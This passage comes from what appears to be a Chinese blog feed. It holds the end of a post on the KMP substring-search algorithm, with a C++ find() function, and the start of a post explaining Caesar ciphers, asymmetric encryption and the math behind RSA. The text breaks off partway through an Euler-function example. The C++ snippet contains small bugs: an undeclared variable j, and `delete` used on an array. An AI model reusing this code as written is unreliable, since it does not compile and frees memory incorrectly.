xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">target</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span></span></span></span>的位置，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mo>=</mo><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mi mathvariant="normal">.</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">j=target.len-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>；或者未找到，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mi>c</mi><mi>h</mi><mi mathvariant="normal">.</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i=ch.len-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。</p><h3 id="查找函数的实现"><a class="markdownIt-Anchor" href="#查找函数的实现"></a> 查找函数的实现</h3><p>  本节实现查找函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">const</span> seqString &amp; ch, <span class="type">const</span> seqString &amp; target)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span>* p=<span class="literal">NULL</span>;<span class="comment">//存放失效函数</span></span><br><span class="line">    p=<span class="built_in">failurefunc</span>(target);<span class="comment">//获取失效函数</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i=j=<span class="number">0</span>;<span class="comment">//定位指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(i&lt;ch.len&amp;&amp;j&lt;target.len)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ch.data[i]==target.data[j]) &#123;i++;j++;&#125;<span class="comment">//相等则自增</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(j==<span class="number">0</span>) i++;<span class="comment">//不相等但是j已经为零时，i自增</span></span><br><span class="line">            <span class="keyword">else</span> j=p[j<span class="number">-1</span>]<span class="number">+1</span>;<span class="comment">//否则更新j的值 </span></span><br><span class="line">    &#125;<span class="comment">//end while</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> p;<span class="comment">//释放内存</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(j==target.len) <span class="comment">//比较完最后一个字符后，j又自增了一次，所以应该是最后一个元素的下标+1</span></span><br><span class="line">        <span class="keyword">return</span> i-j;<span class="comment">//如果找到了以后才退出，那么返回位置</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//否则就是没找到，返回未找到</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h1><p>  KMP算法的时间复杂度是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>的，因为我们即便可能需要扫描目标字符串许多遍，但主字符串我们只需要扫描一遍，也就是说不会超过<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>次。KMP算法为什么能节省时间，本质上使我们利用了扫描匹配过程中匹配失败的信息。<strong>对于匹配失败的节点，我们利用两个指针直接跳过了许多次扫描</strong>，因而节省了时间。可以说，<strong>KMP算法相比于枚举法有着更高的信息利用率。</strong></p>]]></content>
    
    
    <summary type="html">字符串的基本操作之一是find()函数，即从某一个字符串中找到对应的子串位置。KMP算法是目前为止最为广泛使用的寻找子字符串的算法。</summary>
    
    
    
    <category term="程序设计" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    <category term="算法" scheme="https://blog.snowflake.zone/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="数据结构" scheme="https://blog.snowflake.zone/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="算法" scheme="https://blog.snowflake.zone/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>RSA加密算法</title>
    <link href="https://blog.snowflake.zone/posts/1/"/>
    <id>https://blog.snowflake.zone/posts/1/</id>
    <published>2022-05-18T02:46:46.000Z</published>
    <updated>2022-05-18T02:46:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="加密算法"><a class="markdownIt-Anchor" href="#加密算法"></a> 加密算法</h1><p>  谈到加密算法，我们不得不谈一下密码学中加密算法的两个分支：<strong>对称加密</strong>和<strong>非对称加密</strong>。</p><h2 id="对称加密算法以单表替代密码为例"><a class="markdownIt-Anchor" href="#对称加密算法以单表替代密码为例"></a> 对称加密算法（以单表替代密码为例）</h2><p>  我们假设Felix要向你们之间的某位读者发送一段信息<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span>，为方便起见，我们假设这段信息是&quot;THANKYOUFORFOLLOWINGME&quot;。现在，为了使这段信息不被外人所知，需要对其加密。我们假设加密方式为：<strong>所有用后一位字母替代</strong>，那么上述的这段信息就被加密为：“UIBOLZPVGPSGPMMPXJOHNF”，这是<strong>不可读的</strong>。当读者接收到这段信息时，只需要将加密后的信息往前倒退一位，便可以得到原始信息。我们把原始信息称为<strong>明文</strong>，加密后的信息称为<strong>密文</strong>，加密方式（在上例中体现为字母的替代）称为<strong>加密算法</strong>，解密方式（在上例中体现为字母的替代）称为<strong>解密算法</strong>，加密时移动的位数1称为<strong>加密密钥</strong>，解密时移动的位数1称为<strong>解密密钥</strong>。</p><p>  上面这种加密方式一般被称为<strong>单表替代密码</strong>，上述的例子又是其中十分特殊的一种，称为<strong>凯撒密码</strong>。我们观察可以知道，加密密钥和解密密钥是相同的，我们把具有这种性质的加密算法称为<strong>对称加密算法</strong>。</p><p>  对称加密算法是有好处的：其计算量小，加密简单，用于加密和解密的密钥相同，算法只需要选取<strong>可逆映射</strong>即可。但对称加密也存在一些问题：双方在通信前需要互相商定密钥，并且在通信过程中，任何一方的密钥泄露都将使得所有通信被破解；其次，任何两者之间的通信都需要选取<strong>不同的密钥</strong>，这在通信网复杂的情况下，每个通信节点都需要储存数量庞大的密钥，给用户带来负担。</p><p>  当然，密钥泄露的问题不是不可解决的。我们可以在每一次通信都使用不同的密钥，这样，密文在理论上是<strong>牢不可破的</strong>。但是这又会带来问题，我们如何获得这么庞大数量的密钥呢？我们又如何储存呢？密钥的分发在这种情况下变成了棘手的问题。所以，<strong>一次一密</strong>的加密方式在实际应用中是不广泛的。</p><h2 id="非对称加密"><a class="markdownIt-Anchor" href="#非对称加密"></a> 非对称加密</h2><p>  随即而来进入我们脑海的一种加密方式就是非对称加密，即<strong>加密密钥</strong>和<strong>解密密钥</strong>不相同的加密方式。我们一般称前者为<strong>公钥</strong>，后者为<strong>私钥</strong>，因为前者是公开给所有人的，后者是密文接收方自己保存的。我们知道，由于加密和解密是逆运算，我们是有可能通过暴力破解求出加密方式的逆运算的。所以，为了保证安全性，非对称加密的算法一般都<strong>十分复杂</strong>，运算量相比于对称加密算法繁琐得多，因此，非对称加密<strong>牺牲了加密效率，换来了更高的安全性</strong>。下面我们来讨论一下非对称加密中的典型加密方式，即RSA加密。</p><h1 id="rsa加密算法"><a class="markdownIt-Anchor" href="#rsa加密算法"></a> RSA加密算法</h1><h2 id="基于的数学运算原理模运算"><a class="markdownIt-Anchor" href="#基于的数学运算原理模运算"></a> 基于的数学运算原理——模运算</h2><p>  首先我们来思考一个问题，有什么方式使得<strong>攻击者知道加密方式的情况下很难求算出其逆运算</strong>？有一种运算符合类似的性质：其正向运算十分简单，但逆运算极其复杂，它是模运算（Mod）。模运算就是我们一般说的求余。其正向运算是很简单的，例如</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mn>3</mn><mn>3</mn></msup><mtext> mod </mtext><mn>7</mn><mo>=</mo><mn>6</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">3^3\ \textrm{mod}\ 7=6,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">6</span><span class="mpunct">,</span></span></span></span></span></p><p>完成这个运算只需要一个简单的除法即可，但是设想，如果给出的形式是方程，即</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mn>3</mn><mi>x</mi></msup><mtext> mod </mtext><mn>7</mn><mo>=</mo><mn>6</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">3^x\ \textrm{mod}\ 7=6,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">6</span><span class="mpunct">,</span></span></span></span></span></p><p>求解满足上述方程的x的值，其运算是比较复杂的，因为我们不知道其商的值，也就不能快速利用乘法求算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>，一般我们会使用枚举法求算其解。但是如果方程是</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mn>3</mn><mi>x</mi></msup><mtext> mod </mtext><mn>7156464845153468615315646</mn><mo>=</mo><mn>6</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">3^x\ \textrm{mod}\ 7156464845153468615315646=6,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord">7</span><span class="mord">1</span><span class="mord">5</span><span class="mord">6</span><span class="mord">4</span><span class="mord">6</span><span class="mord">4</span><span class="mord">8</span><span class="mord">4</span><span class="mord">5</span><span class="mord">1</span><span class="mord">5</span><span class="mord">3</span><span class="mord">4</span><span class="mord">6</span><span class="mord">8</span><span class="mord">6</span><span class="mord">1</span><span class="mord">5</span><span class="mord">3</span><span class="mord">1</span><span class="mord">5</span><span class="mord">6</span><span class="mord">4</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">6</span><span class="mpunct">,</span></span></span></span></span></p><p>这时候，枚举法也变得十分困难了，这个方程已经是<strong>计算上不可解的</strong>了。因此，模运算也被称为<strong>单向运算</strong>。RSA就是利用了模运算的这点性质。</p><h2 id="加密算法和解密算法确定"><a class="markdownIt-Anchor" href="#加密算法和解密算法确定"></a> 加密算法和解密算法确定</h2><p>  知道了我们要使用模运算作为加密和解密算法，那么我们不妨假设明文信息是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span>（message），密文信息是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>（cipher），公钥为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span></span></span></span>，私钥为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span>，于是我们可以得到</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mi>m</mi><mi>e</mi></msup><mtext> mod </mtext><mi>N</mi><mo>=</mo><mi>c</mi><mo separator="true">,</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mi>c</mi><mi>d</mi></msup><mtext> mod </mtext><mi>N</mi><mo>=</mo><mi>m</mi><mi mathvariant="normal">.</mi></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}    m^e\ \textrm{mod}\ N=c,\\    c^d\ \textrm{mod}\ N=m.\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">m</span><span class="mord">.</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>消去密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>，上式可化为</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><msup><mi>m</mi><mi>e</mi></msup><mtext> mod </mtext><mi>N</mi><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mtext> mod </mtext><mi>N</mi><mo>=</mo><mi>m</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">(m^e\ \textrm{mod}\ N)^d\ \textrm{mod}\ N=m,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">m</span><span class="mpunct">,</span></span></span></span></span></p><p>可以证明上式等价于</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><mrow><mi>e</mi><mi>d</mi></mrow></msup><mtext> mod </mtext><mi>N</mi><mo>=</mo><mi>m</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">m^{ed}\ \textrm{mod}\ N=m.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord">.</span></span></span></span></span></p><p>这个结论先放在这里，我们后续会使用到它。</p><h2 id="欧拉函数和欧拉定理"><a class="markdownIt-Anchor" href="#欧拉函数和欧拉定理"></a> 欧拉函数和欧拉定理</h2><p>  为了充分理解RSA密码的数学原理，我们需要先提到<strong>欧拉函数</strong>和<strong>欧拉定理</strong>。</p><h3 id="欧拉函数"><a class="markdownIt-Anchor" href="#欧拉函数"></a> 欧拉函数</h3><p>  首先介绍一下欧拉函数：假设给定一个正整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>，欧拉函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>的值是<strong>不超过<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>的与其互质的正整数的数目</strong>，例如不超过6的与6互质的正整数有1和5，那么我们就说，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mn>6</mn><mo stretchy="false">)</mo><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">\varphi(6)=2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord">6</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>。一般求解欧拉函数的值时，我们经常采用素因数分解的方式，让我们来看一个例子：求解<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mn>100</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(100)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mclose">)</span></span></span></span>的值。我们对其质因数分解，得到</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>100</mn><mo>=</mo><msup><mn>2</mn><mn>2</mn></msup><mo>⋅</mo><msup><mn>5</mn><mn>2</mn></msup><mtext>。</mtext></mrow><annotation encoding="application/x-tex">100=2^2\cdot 5^2。</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">。</span></span></span></span></span></p><p>那么其与其互质的整数数量为</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mn>100</mn><mo stretchy="false">)</mo><mo>=</mo><mn>100</mn><mo>×</mo><mo 